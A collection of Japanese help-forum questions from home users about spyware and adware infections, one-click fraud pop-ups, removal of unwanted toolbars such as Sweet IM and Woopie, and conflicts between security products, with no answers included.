ネットの達人はどこまで観ることができるのでしょうか？ここでの質問とかに登場した私達はどこまで情報が知られてしまっているのでしょうか？IPアドレスとかまで知られてしまっているのでしょうか？以前過去質問を覗きました・・・みたいなことを知らせたいかのような私の過去の質問とか検索内容まで私が質問したと同時に次々に並べられてあまりに偶然すぎたのでとても驚いたことがあります。ですのでネットの達人達はどこまで観ることが可能なのか判る方いましたら教えていただきたいです。
ネットつなぐ機器って個人情報ダダ漏れですか？ ネット切ってるときに個人情報含む文書（メール）作成して 暗号化 （base64→1行1文字→256bit (全部半角で英大文字小文字数字記号使って３９文字) のパスワードを行頭につけてSHA256通して（結果も当然39文字にして） ２行目からは同じパスワード＋直前行＋1文字をSHA通す、以下最終行まで 繰り返し） して、パスワードは送る相手の公開鍵で暗号化して 別途メール作成しておいて ネットつなげてからその2通をメール このとき、個人情報は漏れますか？ ネットにつないだ瞬間にスパイウェアが入り込んで HDDのセクタを読むとかされてスパイウェアが ネットつなげてメール送るときにまぎれて自分（スパイウェア配布元など） のとことかに送る とかありませんか？ というか、スパイウェアとかウィルスとか 入ってないのはどうやって確認すればいいのですか。 というか、HDDにどういう信号が記録されている時はまちがいなく安全だとか ファイル単位でハッシュ見て全ファイルOKなのでOKとか もっというとHDDのセクタも空にしたセクタの内容を WinHexなどセクタエディタで見ても見えない（復活できない）と 確認できる方法ってないですか パソコンで個人情報を含む文書を作成するのが少し怖くなったのですが。 というかWinHexとか皆さんご存知でしたか？ 結局道具としてのパソコンはこんなもんなので 人間の行為として法律で禁止する って対応しかできていないというのが現状なのでしょうか。 それでも使わないわけにはいかないならあとで文句をつけられない ようにするには最低どういう対策をしたらいいのでしょうか。
Spybotの常駐をOFFしていたせいか、system tools　とかいう悪い奴に感染してしまったようです。 Spybotで駆除しようとしましたが通常では起動することが出来ず、セーフモードで立ち上げて フルスキャン中・・・・。どなたか、この方法で駆除に成功した方いらっしゃいますか？ Spybot　と　System tool　ではどちらが強い？ もしダメだった場合、有効か駆除ソフトはありますか？ 教えてください。
質問させてください。 ３ヶ月ぶりでしょうか、Ad-Aware(バージョン9.0.1)とSpybot(最新)を使用してスパイウェアの有無を確認しました。すると、結果に Trojan.Win32.Malware.a Win32.Adware.CnsMin Win32.Adware.Cnsmin/D Win32.Worm.Magef Win32.Worm.Magef/B 上記のものが、レジストリに４、ファイルに３、計７つ検出されました。 いずれも「検疫」されたようですが、実際にトロイの木馬被害にあってしまっていたのか、それとも誤検出だったのか調べる方法はないでしょうか？ ・上記の問題はAd-Awareから検出されました。Spybotからは何も検出されませんでした。 ・完全スキャン後に「スキャンログのエクスポート」をメモ帳に保存しましたが、全て英語で見方が分かりません。 ・問題のあったファイルの場所、レジストリの場所が分かりません。 ・まだ再スキャンをかけていません。(計８時間ほどかかるため) ・ウィルス対策ソフトはノートンが入っています(ファイヤーウォールは普段常にON) もし害にあったのなら、PC上で入力していたパスワードなどを全て変更する必要があると思うので、とても困っています。
ノートン　パワーイレイサーって使うと大切なところも壊れますか？ sweet IMという変なソフトが入り込んでいて、消したいので使いたいのですが 使った方、感想聞かせてください。
PCによからぬものが侵入してしまいました スパイウェア駆除ソフトでスキャンすると Spybot ではセーフモードからの起動でも一つしか検出されませんでした （それは修正しました） が　その後　Spyware Striker Pro でスキャンすると14個も検出されました この違いはどう捉えればいいのでしょうか？ 検出されたものは下記になります Trojan.Win32.ExplorerHijak　脅威レベル２ HKEY_LOCAL_MACHINE\Software\Classe\CLSID\{6F5BDD　が8個 Cookie.Tracking Cookies　脅威レベル５ c\documents and settingsユーザー名＠・・・　が6個 これらはどういったものでしょうか？ 上記を検出した　Spyware Striker Pro　はスキャンは無料でも駆除は有料です Spybotや手動で削除できますか？
sweet IM という迷惑なものをインストールしてしまいました。 （無料ＰＤＦをインストールしたら勝手に入り込んできました） プログラムの追加と削除でＰＤＦは消えなかったのでレジストリのアンインストール とかいてあるところから探して削除しました。それでプログラムの追加と削除画面から はきえてくれました。 でもネットを立ち上げるたび、sweet IMが起動し、エラーになるようになりました。 それはプログラムの追加と削除にあって簡単に消せたので消しました。 ネットを立ち上げるたび、sweet IMは表示されなくなってエラーにもなくなったのですが、 sweet IMはスパイウェアなどとネットに書いてあったので不安です。 ちなみに、レジストリでよく見てみるとsweet IMの名がついたフォルダを１つ発見したので、 それは削除しました。 レジストリの編集でサーチをかけたら『全て表示しました』と出て、見た目にはファイルも何も 表示されないのですがこれはもうないということなんでしょうか？ ネットで調べると青文字で100個くらいsweet IMのレジストリが出てきたのでそれを消すのが大変 だったなどと書いてあったのですが・・・ 何かご存知の方がいれば教えてください。 会社のＰＣなのでスパイウェアだったらと思うと不安で仕方ありません。
友人のパソコンのワンクリック詐欺の画面を消すために実験をしてみました。パソコンのOSはXP・SP3です。友人に納得してもらうために操作画面はデジカメで撮影しています。 セキュリティソフトはGData2011を最新版にしてありますが、「18歳以上」の確認で「はい」を押した時、何も警告されなかったとの事です。 有効だと紹介されたシステムの復元を行ったら、パソコンが二度と起動出来なくなってしまいました。復元を指定したら再起動がかかり、Windowsが正常に終了しなかった、と表示されて、セーフモードを指定すると画面が真っ暗になってそのまま動きません。 私はシステムの復元は失敗するかもしれないよ。と言ったのですが、友人は絶対直るはずだ。サイトに紹介されているから間違いない。と言い切って、やれやれ、それじゃやってみるか。と実行したらこの有様です。 質問の趣旨ですが、システムの復元で無事修復出来る人と、このように復元失敗する人とはどこが根本的に違うのでしょう。わかりやすく教えてくださいませんか。ちなみに、このパソコンはワンクリック詐欺のサイトにアクセスする数日前に私が他のトラブル復旧のために出向いていて、その時AcronisTrueImageで外付けHDDにOSまるごとバックアップを取ってあり、現在復旧完了しています。実害はほぼありません。 直しに来い！と呼び出したくせに私に言葉を信じない、今私と共にこのサイトを見ている友人に納得してもらうために、そして、私自身も理解したいので、ご回答をよろしくお願いします。
OSはVISTAです。 woopieをオプトメディア社からインストールしてしまったようで、アクトマッチ広告が消えずに 困っています。 一度woopieをアンインストールした後にもyahooツールバーの欄にwoopieのタブが 表示され、画面下には水色の細長い広告バーが出てきています。 過去の質問をみて試してみたことは、 ・隠しフォルダを全部表示させる ・コントロールパネルのアンインストールで、「オプトメディア」と名前がついているファイルを探しましたが、なし。 ・Cドライブの検索バーから、以下のファイルを検索しましたが、なし。 optserve.exe LP.exe Update Optserve.exe Optserve_net.exe Optlp_Net.exe ・オプトメディアのサイトのヘルプを見て、一度woopieを再インストールして、その後アンインストールを行いましたが、やはりアクトマッチ広告とIEの左上に出てくるwoopieタブは消えない。 以上です。 レジストリ関連は「ファイルを指定して実行→regedit」と入力して格納場所を探すところまでは 分かりますが、どこに格納してあるか分からず諦めました。 アンインストールしても残っているのがとても気持ち悪いので、何とかしたいです。 アドバイスお待ちしています。
画面にアダルトの画面がでるようになり、以前SPYBOTで消せたので、試しましたが、今回は消せません。なにか方法はありませんか？ ７をつかっています。
オンラインスキャンのエフセキュアで、オンラインスキャンしたところ、スパイウェアが見つかりました。 いつもは、ウィルスソフトを導入していて、そのソフトでウィルス対策で来ていると思っていたのですが、 どうして、このようなことになるのでしょうか。
身に覚えのないアダルトサイドから登録が完了したので７２時間以内に５万円支払えとの通知が画面で５，６分おきに連絡してきます。メールではなく画像付きで送られてきます。 添付いたしておきますがこの種の問題はどちらに相談していいものやら案じております。 皆さんのお知恵お借りしたいと存じますよろしくお願い致します。
久しぶりにスパイボッドでスキンしたのですが、Killsoftというマルウェイらしき物が検出されたのですが、このKillsoftはどんな時に入り込むのでしょうか？「ええ、削除はしましたが、よろしいのでしょうか？」皆様の知識をお借りしたく質問いたします。
質問させていただきます。 最近、匿名掲示板の2chでセキュリティの異常が起きたらしく2chをブラウザで開くとウイルスやアドウェアなどに侵入されるという話を聞きました。 私も昨日その話を聞く前に開いていたので、もしかしたらすでに何かに感染しているのではないかと不安になりました。 ウイルス対策としてはウイルスバスター2011クラウドを入れていて最新のアップデートを行ってから検索したところ脅威は発見されませんでした。 しかしながらアドウェアやスパイウェアはウイルスソフトでは検知できないとも聞きます。 今のところパソコンの挙動に不審な点はみられませんが、何か侵入している可能性はありますでしょうか？ ・侵入しているかの確認 ・侵入されていた場合の対処はどのようにすればいいか よろしくお願いします。
アダルトサイトのポップアップがデスクトップに出てくるのですが、 どうしても削除したいです。 素人秘密ムービーというサイトです。ワンクリ詐欺サイトのようです。 どうしても削除したいんですがどうしたらいいですか? ウィルスソフト等で対応できないでしょうか？ パソコンを初期化してもよいのですができればやりたくないところです。
Cookie-Doubleclickがリアルタイムで検出されました。 プロセスはiexplore.exeでしたが、 windows7なのでIEは削除してあります。 使っていないのにどうしてIEのCookieからリアルタイムでCookie-Doubleclickが入るんでしょうか？
実家の母からSOSです。ＰＣ画面に英語の広告が出て、何もできなくなったといいます。 再起動しても同じ広告が出るのみで、画面背景は真っ黒だそうです。 私はなんらかのマルウェアによるものと思っていますが、対処法を知りません。 ちなみにこの症状は昨日の夕方から始まったとのこと。 先週木曜日に私自身が、母のＰＣを使った際は異常なし。 avast!anti virusとmicrosoft security essentialsを常駐させています。 どうしたらいいでしょう？
　アダルトサイトをどんなもんかと思い覗いていたら、入会金を請求する画面が５分おき程度に表示され、カウントダウンをしています。無視することとし、ポップアップブロック（高）を設定し、ウイルスバスターで簡易検索をかけてウイルスが無いことを確認しましたが、まだ表示します。 　どうしたらいいでしょうか。？ 　明日、家族とスカイプでビデオ会話の予定なんですが、困っています。
adwareでスパイウェア検出後に検疫アクションを実行をするとadwareが終了してしまいます。 その後起動してに検疫項目を見ても何も追加されていません。 これはadware無効化ウイルスか何かでしょうか？ どなたか教えてください。お願いします。
フレッツ光のウィルス対策ソフト（月５００円くらいのもの）ですが、パーソナルファイアウォール（以後PFとします）を設定する画面が出てきません。タグのホームネットワーク管理だ思うのですが、インストールが必要と出てきます。このインストールをしないと、PFの設定変更ができないようです。どうしたらよろしいでしょうか？素人ですみません・・・カテゴリ違いでしたらすみません。
IEの履歴をふとみたところ、毎日storage.conduit.com・・・・・や、search.conduit.com・・・・というアドレスへ勝手に接続しているようで、マルウェアじゃないかと考えています。 対象方法を教えていただきたいです！ 初心者です！どうぞよろしくお願いします！！ OS:Win Vista
セキュリティソフト：ウィルスバスター2010 脅威名　　　　　　：TROJ_GEN.R47C3IH と TROJ_GEN.R21C3IHの2種類 ファイル名　　　　：SBS_VE_AMBR_20101016172035.058_ 148とSBS_VE_AMBR_20101016182805.648_ 357 ファイルの場所　：C:Windows/temp 他のセキュリティソフト（Ad-Aware、SUPERAntiSpywareFreeEdition）で該当ファイルをスキャンしても何も見つかりませんでした。 しかし、Ad-Awareで C/ユーザー/AppDate/Local/Google/Chrome/User Date/Default/Cache のf_0010d1というファイル（トロイの木馬でした。）をスキャンすると上記のC:Windows/tempにあるSBS_VE_AMBR_20101016172035.058_ 148などのファイルが作られ、末尾の148の数字が増えていくという動作をしています。 流れとしたら、Ad-Awareでf_0010d1をスキャンするたびにC:Windows/tempにSBS_VE_AMBR_*****ファイルが作られる。 そして、「f_0010d1」はAd-Awareのみでトロイの木馬と判断される。 「SBS_VE_AMBR_*****」はウィルスバスター2010のみでトロイの木馬と判断される。 という感じです。 「f_0010d1」ファイルをAd-Awareでスキャンしなければ問題ないような気もしますが、どうすればいいでしょうか？
パソコン初心者です。 最近ヤマダ電機でパソコンを買いました。 初期設定をヤマダ電機でしてくれるということでしたので、 任せましたところ、楽でんという相談窓口がありました。 私ではなく主人がパソコンで株の売買をしています。 最近リモートサポートなるものをしたそうです。 パソコンを遠隔操作するソフトをダウンロード（Re Support Co.ltd)したり 遠隔操作でパソコンを直してもらったりとか。 そういう遠隔操作というのは安全なものなのでしょうか教えてださい。 というのはNHKでBOTウィルスなるものをみたからです。 初心者で申し訳ありません。ご教授ねがいます。
今週からfor you premiumからの迷惑メールが来ています。 以前ここで迷惑メールについて質問して対処法を教えて 貰ったのに退会手続きをしてしまいました。 更に早乙女　聖に返信してしまいました。 450万がどうのこうの言うので怖かったのです。 私は馬鹿ですね。これからどうすれば良いでしょうか？ 警察に相談するべきでしょうか？
spyboｔホームページなくなってませんか？ しかも、アップデートできず、アンインストールしたら、再インストールも出来ません。
先日ワンクリックウェアにひっかかってしまいました。サイトは「アダルト動画マニア｛galerosextube}」です。空の牙でワンクリック削除ツールをダウンロードして一時的に削除はできたのですが、再起動したり、また電源を入れなおすとウェアが復活してしまいます。永久にこのウェアを削除したいのですがどうすればいいでしょうか？
フェイスブックをしていて、アプリのロードができなくなったので、すぐ下にあった説明文から、 アドビのフラッシュプレイヤーのダウンロードサイトに移動し、ダウンロードしました。 気になることがあるのは、そのダウンロードの際に、右端にチェックボックスがあって、 「McAfee Security Scan Plusも含む」となっていたんです。 気がつかなくて、インストールしている途中に気がつきました。 もうすでにインストールしてしまっているのですが、私のＰＣにはすでに 「マカフィーセキュリティーセンター」が入っています。 すでに入れていた「マカフィーセキュリティーセンター」と 「McAfee Security Scan Plus」は競合しないのでしょうか？ 今のところ、動作に不具合はないように感じておりますが、 最近、セキュリティソフトの競合で困ったので、非常に不安です。 また、アドビ社のフラッシュプレイヤーのインストール中に、「ＩＥと競合する」と、 表示が出ました。これも非常に不安です。ＩＥを使用したいのですがどうしたらよいでしょうか。 わかる方教えてください。よろしくお願いします。
夜の１１時前になると自然にシャットダウンされてしまいます。５日ほど前からこの現象があり、昨日ウイルスバスターをバージョンアップ（２０１０から２０１１）にしたのですが直りません。無線ラン（？、インターネットをつなぐための黒い縦長のやつ）を見ると上から二つ目の鍵のマークが光ってませんでした。ちなみにＶｉｓｔです。 パソコンの知識はまったくないので分かりません。どうすればよいですか。
消しても復活するCookieがあります。 完全に削除するには、どうしたら良いでしょうか？ 環境と症状を書きます。 ・環境 　OS: Mac OS 10.6.5 　ブラウザ: Safari 5.0.2 ・症状 　次のCookieが、 　　環境設定＞セキュリティ＞Cookieを表示＞取り除く 　の操作で消しても、少し時間が経つと、いつのまにか復活してます。 　Webサイト: ******.blog**.fc2.com（←「*」の部分は伏せ字ですが、いつも同じ内容です。） 　名前: cookietest 　パス: / 　有効期限: （消した後の１０日後） 　コンテンツ: test どうぞよろしくお願いします。
スパイウェアに犯されて、スクリプトページのエラーが出ます。ハードディスクを再インストールしました。最新のノートンでスキャンしても解決しません。ＯＳはＸＰです。どうすればいいですか？スパイウェア対策ソフトで解決できるならそうしたいです。
契約通知 ご入会手続きが完了しました。 有料アダルト動画配信サイトにご入会頂き誠に有難うございます。 ご入会に伴い料金が発生しておりますので、上記確認ボタンからの ご契約内容をご確認ください。 等のバナー広告が現れる なんとかならないか？
同居している人間が、私のパソコンを傍受しているようなのですが、（状況から、知るはずのない事を知っていたりする）　今までに、パソコンの日記の部分がある日突然開けなくなったり、ＮＸパッドが動くように設定されていたり、とても気持ち悪いのですが、本人の手元を見たわけではありませんので、何とも言えない部分もあります。 そこで、お聞きしたいのですが、誰かが操作しなければ、勝手にパッドが有効になっていたり日記が 開けなくなっていたりする現象は不可能ですよね。 パソコンの持ち運びの衝撃で、設定が変わるとか・・・そんなことは考えられないことですよね。 初期化して、すっきりと使っていると、少ししてその現象が起きます。 なにか、傍受するようなソフトや操作をされているのでしょうか？ 気持ち悪くてしょうがないです。 どうぞ、お知恵を貸してください。 お願いいたします。
ＯＳはビスタです、それで スパイウェア用ソフトで、皆さんなら どれを選びますか？という質問なんですが 今回考えてるのは 『AD-Aware』『Spybot』『SUPERAntiSpyware』 の３種類なんですが 余談を言うと、ウィルス用ソフトはESET Smart Securityを使用してます それで、以前はＯＳにＭＥを使用しており ブラウザは今も昔もＦｉｒｅｆｏｘを使用 ただ、ビスタに変更してからも 以前は無料のアダ○ト動画をＤＬするのに 頻繁に複数…大体１０個以上のアダ○トＨＰにアクセスしてました それを考えて、この３つでスパイチェックしてたんですが ３つでのチェックに関しては ３つ入れれば大丈夫等と考えてた訳じゃなく ３つで使い心地を比較 性能と使い易さで１～２個に絞ろうと思ってました 但し、３つ共同じではなくシステムは違うとも聞いてます それで、一時期は『Spybot』が比較的弱いと聞いてましたが 使い易さ等も考えて『Spybot』と『SUPERAntiSpyware』 の２つを候補に考えてました しかし、その直後位に『AD-Aware』も仕様変更(？)して 使い易さ等は変らなく感じたのと 今はアダ○トＨＰへのアクセスも随分少なくなった為 現在は迷ってる状態です ３つ使用しても良いんですが、それだと時間が掛かり過ぎる為 どうしようか考えてます そこで聞きたいんですが、皆さんが私の立場なら どのソフトを使用しますか？
windows xp,ie 7です。何度かパソコンの調子が悪い時は復元やxpの再生をしていましたが２，３日前 セキュリティよりadobe flash playerに問題があると警告され、それを再インストしますが ダウンロードはできてもアプリをインストできません。レジストリーも問題ないので仕方なくxpの再インストをしようとしますが再起動からxpのロゴマークが出ている間F12を押したり連打したりもしますが windowsが起動してしまいます。どうすればxpを再インストできますか？ 問題のadobe flash playerは削除できて現在ウイルス等は検出されていません。 何か問題があってadobe flash playerがインストできないのでしょうがスキャンしてもセキュリティより問題無しと表示されればリカバリーできなくてもそのまま使っていていいものでしょうか？ーーー動画等がもう見られませんが。隠れたウイルスが情報をばらまいたりパスワード等を検知するのではと心配です。
SymantecEndpointProtectionを使っているのですが、これが邪魔をしてネットワークプリンタなどが使えなくなっています。 エラーメッセージとして”トラフィックが遮断されています”と表示されます。 ネットワーク脅威防止のオプションで”ネットワークプリンタを共有する”にチェックを入れているのですがこのような状態です。 解消するにはどのような設定をすればよいでしょうか？
PCを捨てろ以外でお願いします。
お世話になります。 ネットオークションで、頼んだＰＣ修理ですが、本当に安全なのかどうか、心配に なりました。 ウィルス防止には、現在　アバスト（フリーウェア）を使用しています。 これだけでは、スパイウェアというもは、防げないのでしょうか？ もし、防げないとするならば、併用してスパイウェアを防止するソフトを使用したいと 思います。 現在、使いやすくて　安全なスパイウェア防止ソフト、　お勧めがあれば教えて下さい。 フリーウェアが望ましいです。
非常に困っています。慣れてないので良ければ細かく指示いただけるとありがたいです。 有料のウィルス対策用のを新たにインストールしようとすると、何度もＡｄ-Ａｗａｒｅを削除してから インストールしてくださいとあったので、プログラムの変更と削除を見たのですが、そこにはなくて、 フォルダにあるＡｄ-Ａｗａｒｅのショートカットだけをゴミ箱に捨ててしまいました。それでもまだエラーは出ていてＡｄ-Ａｗａｒｅを新たにインストールしてから、アンインストールしようと思ったのですが途中で止まってしまい、インストールもできなくて困っています。色々検索したりしたのですが、多分どこかに残っているのかと思ってます。 完全になくす方法がありましたら教えていただければと思います。 宜しくお願いします。 ＯＳはＸＰです。
ntt.setupからアクセスを受けています ログを見る限り１週間位前から一日に３回ほど外部から来ているようです 全てファイアウォールでブロックしているのですが、ntt.setupとは何なのでしょうか？ 使用FW：ZoneAlarm OS：XPpro3
　突然身に覚えのないポップアップがディスクトップにでてきました。「Kikin」というものですが、検索すると、ツールバーが勝手にインストールされて困って、プログラムの削除で見つけてアンインストできたそうですが、私の場合、それはありません。出てこなくする(ポップアップのプログラムを勝手に設定されてしまったのを解除する)方法を教えてください。よろしくお願いします。 　見づらいと思いますが、画像も添付します。 　PCにアドウェア的なものを入れられてしまって気持ち悪いです。セキュリティが不十分だったのでしょうか....。
セキュリティソフトは入っていますが、さっき検索したＵＲＬが第三者にわかる場合は、具体的にどのような場合がありますか？ ※各セキュリティソフトの検索には全く引っかかりません。 無数にあるウェブ上のサイトの中で、特定のネットユーザーに対し閲覧しているＵＲＬが的確に特定し指摘できるのはどのような時か。 　
今日、ネットでDAEMON Tool ver4以降にはアドウェアという名称のスパイウェアが入っていると見ました。 私が使用しているのはDAEMON Tools Lite　ver4.30.4.0027なのですがコレにもアドウェア（スパイウェア）は入っているのでしょうか？ 入っていた場合に出る症状（ツールバーが出たり、広告がでたり）は、今のところありません。 一応、ウイルスバスター2011で検索を掛けても何も脅威は発見されませんでした。 PC初心者で、大変心配になってます。どうか回答をお願いします。
ノートブックを２ヶ月前に購入したばかりです。（HP windows7 英語版） その時、ノートンのセキュリティソフト(お試し無料）がついてました。 期限が切れて、 spyware and unwanted software protection & virus protection(Important)という警告が出るようになりました。 ノートンのソフトを購入する余裕がないので友達に相談したら、avivaという無料ソフトがあると教えてくれました。 それで、早速セットアップしたんですけど、警告はなくなったものの、コンピューターが正常に機能しなくなりました。（モバイルインターネットなのですが、全く接続しなくなった。） シャットダウンもできなくなってしまったので、無理やり電源を切って、しばらくして起動させたら、 AVIVAのアプリケーションもなくなってました。 それで、正常に機能するようになったのですが、また警告が出ます。 今使い勝手が凄くいいんですけど、このまま使用しても大丈夫でしょうか。
Windows XP, Provider は　Yahoo の友人のＰＣに毎日”Ｈ”系の文書が入ってきて困っています。 どうしたら stop させることができますか？
使っているパソコンで、Forefront　client　Securityから『悪意がある、もしくは可能性があるソフトウェアを検知しました』というようなメッセージが出ました。 検知内容としては『Backdoor:Win32/IRCBot.gen』です。 削除しても削除してもそのエラーが出てしまいます。 どのように対処すればよいのでしょうか？ OS：WindowsXP セキュリティソフト：Microsoft Forefront Client Security
私は、「Windows Liveメール」を使用していますが、迷惑メールの設定をして、そのメールを受信したら削除するというように設定していますが、「受信トレイ」に入ってきます。そのメールには「SPAM」と表示されているのですが、どうしたら迷惑メール・SPAMメールを受信トレイに入れないようできるのでしょうか？ OSはWIN7です。宜しくお願いします。
マカフィーとウェブルート社スパイスイーパー がプレインストールされていたＶＡＩＯを購入したのですが、スパイスイーパーの更新が切れたので、アップグレードしたのです。（スパイスイーパー　with antiverusになっていました。） すると、ＰＣがありえないぐらい重たくなりました。競合でしょうか。 また、マカフィーのファイアウォールが突然無効になったりしてびっくりしています。 友だちは初期化したほうがいいといいますが、データのバックアップやシステムのバックアップをしていなかったので、初期化はしたくありません。 競合問題を解決すれば、ＰＣが正常に動作すると思いますが、スパイスイーパーのファイアウォールを解除するだけでいいのでしょうか。ほかのサイトではアンチウイルスの機能が競合しているのでそれを解除すればよいと書いてありました。 緊急で対応を迫られております。よろしくお願いします。 ＰＳ　解除の方法を教えてくださると助かります。
お気に入りに文字化けしたサイトのタイトルが突然現れました。（３つ） 一度開いてみると韓国のサイトの様で、何か通販の様なサイトでした。（商品が色々載ってました） お気に入りから削除したのですが、次の日になるとまた現れてました。 何度も削除しても現れます。 どうにかして出てこない様にする方法は有りますでしょうか？ 困っております。
アバスト！アンチウイルス、バージョン５の、右下のくるくる回るアイコンについて質問です。 結構前に、アバストをバージョン４から５に更新したのですが、その際に、右下のくるくる回るアイコンが、オレンジ色に、赤くて細い縦線が何本も入った、なんとも気持ち悪い見た目になりました。 しかもアイコンが回ると赤い線も回ります…。 最初は、こういうデザインかな、と思っていたのですが、母親のパソコンにもアバストをインストールしたところ、そちらのアイコンは、普通に純粋なオレンジ色で、赤い線は入っていませんでした。 なぜ僕のほうには赤い線があるのでしょうか…。 ちなみにアバストを開いてるときのタスクバーについてるのアイコンも、赤い線があって気持ち悪いです。 見づらいでしょうが、画像も載せておきます。 もしかしたらウイルス？なんて思ってますが、パソコンの挙動にこれと言って不審なところはありません。 なぜこのような見た目になっているのでしょうか…？ もしご存知でしたら回等よろしくお願いします！
レジストリーのことで・・・ Uniblue Registry Booster 2010--とは無料でダウンロードできるとありますが、 なんとなく不安です。ご活用された方にお尋ねします。PCが軽くなるとか、PRされてますが、 無料でそんな事ができますか。いつまでも初歩から抜け出せない者ですので、余分なら今は トラブルもないので、敬遠しておこうかと思ってます。たまたま見た記事ですから、、、、
Googleのツールバーを使用しているのですが今日になって突然、ツールバーの設定ボタンと検索履歴を表示するボタンをクリックすると「これは安全でないことが報告されているwebサイトです」と表示されます。 アンインストールしてもう一度インストールしましたが改善されませんでした。Googleのツールバーが危険とは思えないのですがこれは何が起きているのでしょうか？ メッセージの下のほうの詳細などのリンクをクリックするとSmartscreenのサイトが表示されます。これはSmartscreenが誤認識しているような状態なのでしょうか？
助けてください。ウイルスかスパイウェアに感染したようです。 私はパソコンに疎く… ネットサーフィンくらいしかしないです。 ウイルスとスパイウェアの違いも正直わかりませんが ちょっと目を通すと、スパイウェアなのかと思い、こちらに投稿いたしました。 先日実家に帰った時に 実家のパソコンから、私が利用しているホットメールや、ネットバンキング、クレジットカードのオンライン利用明細などにログインしました。 あとはいつも、自分の家のパソコンで見ているサイトを閲覧しました。 あとは、何か調べ物をする際、よくわからないサイトにいってしまったくらいです。 特に怪しいサイトにログインしたりなどはしていないと思うのですが・・・ そして今、自分の家に帰って、ホットメールの画面を開くと 父親の名前で、メールが来ていました。 しかも、エクセルのファイルが添付されていて、私の名前入り。 父親からメールは来たことはなく、また私のアドレスは知らないはずですが 緊急なのかなと思って 開いてしまいました。 添付ファイルはブロックされましたと表示されたので、メールは開いたけれど、 添付ファイルは、おそらく開いてはいないと思います。 そのあと、ウイルスバスターに入っているのでクイック検索をしたら、何も検出されなかったんですが 自分の家のパソコンは大丈夫なのでしょうか。 ウイルスバスターにひっかからないものもあったりするんでしょうか。 メールはすぐ削除しました。 そして実家のパソコンには 私の名前でブックマークにフォルダを今回作成していて おそらくそこから名前が拾われ、パソコンの利用者は父親の名前になっているそうなので そこからも名前が拾われ、今回のようなメールが送られてきたのかと思います。 ブックマークにはネットバンキングなどのサイトも登録してあります。 最悪、私のネットバンキングや、クレジットカードの会員サイトのＩＤやパスワードが外部に漏れて 勝手にログインされるとか、 私がホットメールで登録しているアドレスに勝手にメールが送られウイルスなどがついたファイルが添付されて送信されたり そういうこともありえるのでしょうか。 実家の家族にはすぐ電話して聞いてみましたが 深夜のことなので、 全くパソコンのわからない母親が出て、 「感染したっぽいってお父さんがなんか言ってた」 くらいしか言ってなかったです。 父親も、パソコンにものすごく疎いので(ネットサーフィンくらいしかしない) とくに焦ったりとかしていなかったようで、そのまま寝てしまったようで… 実家のパソコンも、ウイルスバスターがついており、 感染したっぽい前日くらいにスキャンした時は何もありませんでした。 自分のお金や個人情報にかかわることが、 実家のパソコンにも、うちのパソコンにも入っていたりログインしたりしているので そして父の名前や私の名前で勝手に私もホットメールに添付ファイルが送付されてきたりで かなりパニックになっています。 深夜なのでどうすることもできず。 詳しい方、助けてください！ どう対処すればいいのか。 ネットバンキングなどのＩＤとパスワードを使うものはすべてパスワード変更をしたほうがいいのか。 こういう場合、どのような被害が考えられるか。 かなり焦っています。 もうみんな実家は寝てしまい、明日の朝まで確認がとれませんし 皆仕事で、パソコンをいじったり問い合わせをしたりする時間は無いと思うんです。 また家族もほぼパソコンのことはわからないので そして距離も離れていることと 今までウイルスなどに感染したこともないのに 今回帰省して私が利用してからかかったようで責任を感じているので なんとかしてあげたいです。 お願い致します！！
AVASTというソフトでメールが使えなくなります。 AVASTという無料のアンチウイルスソフトを長年使っているのですが、最近メールが使えなくなりました。 というのも、ノートパソコンを持って歩く事が多いのですが、自宅ではメールが使えるのにパソコンを持ち出して、他のネットワークに繋ぐとPOP3サーバに繋がりません。 いろいろ悩んだ末に、AVASTを一時的に停止するとPOP3サーバにログインできメールが受け取れます。 これはどうすれば良いのでしょうか？ メールソフトはoutlookexpress6.0です。 AVASTのバージョンは5.06　フリーバージョンです。 よろしくおねがいします。
一般的なセキュリティソフトでスパイウエア、マルウエアまできちんと駆除してくれるでしょうか？ ＡＶＩＲＡを使っているのですが？スパイウエア、マルウエア専用ソフトはいれる必要はあるのでしょうか？最近、security toolに感染したとネットに書き込みがたくさんあります。私は経験はありませんがどういった状況で感染する物なのか？・・・・例えばノートンとか？対応しなかったのか？通常の総合セキュリティソフトに任せきりだからでしょうか？そう考えるとスパイウエア、マルウエア用の専門のソフトが必要か聞いてみたかったのです。宜しくお願い致します。
コンピューターマルウエアー対策について 今OCN(光ntt)で契約してますが、ファイアーウォール等他はすべていいのですが、 マルウェアーが無効になってます、　ウィルス対策がダメだとか、　trend　microを 入れろとか。 別のpcでkingsoft無償分を採用してますが、すべて完璧に作動してくれてます。 このkingsoftに変えようと思ってコンパネよりセキュリティーツールを外そうと思っても はずせません。　 いい方法はありませんでしょうか？　お助けを？ snapper888
フリーのヤフーメールを使ってますが迷惑メールのボックスにも大事なメールが入る事もあるので毎日点検していますがスパムメールが多くなるとしつこいメルアドは 受信拒否に登録しますがこれは面倒でしかもドメインを変えたりで受信ボックスの方へもあえて入り込む執拗なスパムメールは困ったもんです。迷惑メールのボックスに振り分けられたスパムメールを２度と入れない設定ができる方法あるいはソフトがありましたら教えて下さい。
ハッキングで、ワード文書を盗まれることはありますか？ ホームページを作っています。 そのホームページの内容に反対している粘着質の人がいます。パソコンのスキルが非常に高い人物なので、心配です。 そのホームページの作成主がバレる程度のことは覚悟していますが、別に作っているワード文書が盗まれたら大変なので、質問しました。 もし、その可能性があなら、対策方法を教えていただけたらありがたいです。
サイト（特定ではない）にアクセスすると広告ページも一緒に開きます。 最近サイトにアクセスすると広告ページも一緒に開きます。 アクセスサイトは特定ではないのですが、justin.tvが特に多く、広告ページはほぼ ttp://serw.clicksor.com/newServing/cpalinks.php?qid=1287449538898track&memkey=380be66fecc1717641f9d0c1f7918ace&clck_sid=225079&clck_pid=114819&default=http%3A%2F%2Finformharry.com%2Fdefault.php%3Fserverfile%3Dpopdirect%26siteid%3Dclickbanner%26subid%3D24598 （上記広告ページにアクセスする場合、自己責任でお願いします。） のページです。 ウィルス検索もウィルスバスタ2010、AD-Awareで検索しても、クッキー程度しか検出されません。 これは、justin.tvの広告なのでしょうか？ それとも、なにか変なアプリケーションをインストールしてしまったのでしょうか？ 何かおわかりになられる方ご教授お願いします。 以前に上記同様の質問をしました。そのときはTrend Microのウィルスバスター2011クラウドの広告ページで、特に問題はないようでしたが、今回のは海外のサイトのようで不安でしたので再度同様の質問をさせていただきました。
